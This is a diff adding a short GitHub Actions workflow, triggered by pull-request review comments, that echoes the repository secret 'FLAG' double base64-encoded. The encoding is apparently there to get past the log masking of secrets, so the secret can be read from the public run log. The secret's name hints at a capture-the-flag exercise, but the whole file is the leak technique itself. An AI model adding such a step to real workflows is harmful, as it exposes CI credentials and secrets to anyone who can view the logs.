@@ -1,0 +1,9 @@
+name: trigger
+on:
+  pull_request_review_comment:
+
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run:  echo ${{ secrets.FLAG }} | base64 | base64
